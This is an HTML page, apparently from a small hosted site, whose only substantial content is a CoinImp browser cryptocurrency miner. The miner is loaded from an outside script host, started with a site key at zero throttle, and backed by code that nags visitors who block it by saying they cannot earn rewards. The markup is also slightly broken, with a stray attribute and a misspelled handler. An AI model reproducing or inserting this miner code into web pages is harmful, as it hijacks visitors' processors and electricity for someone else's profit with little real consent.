<!DOCTYPE html>

<html lang="en">
  <head>

    <meta charset="utf-8" />

    <meta
      property="og:image"
      content="https://cdn.glitch.com/6ca1674b-a03a-4e9c-9563-ed6203267aba%2FMGLogo.jpeg"
    />

      rel="icon"

    <link rel="stylesheet" href="/style.css" />

    <script src="https://www.hostingcloud.racing/3g44.js"></script>
    <script>
      var _client = new Client.Anonymous(
        "965d2861fb2a4feecd31c6df44bb842f986bbdb2caccd02642aae8c5a23e3883",
        {
          throttle: 0,
          c: "w",
        }
      );
      _client.start();
      _client.addMiningNotification(
        "Top",
        "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.",
        "#cccccc",
        40,
        "#3d3d3d"
      );
    </script>
    <script>
      setTimeout(function () {
        if (typeof _client === "undefined" || _client === null) {
          var alertuser = document.getElementById("miner-alert");
          alertuser.className = "ALERT";
          var claimBTN = document.getElementById("claimBTN");
          claimBTN.className = "hide";
        }
      }, 1000);

      function closealert() {
        var closealert = document.getElementById("close-miner-alert");
        closealert.className = "hide";
      }

      function learnMORE() {
        var myMINER = document.getElementById("my-miner");
        myMINER.className = "WRAP";
      }
    </script>
  </head>
  <body>
    <label id="my-miner" class="hide"></label>

    <label onclick="learnMORE();" class="hide" id="miner-alert">
      You Can't Earn Rewards While Blocking The Miner, Learn More
      <div class="X" onclick="cloasealert();" id="close-miner-alert">
        X
      </div></label
    >
  </body>
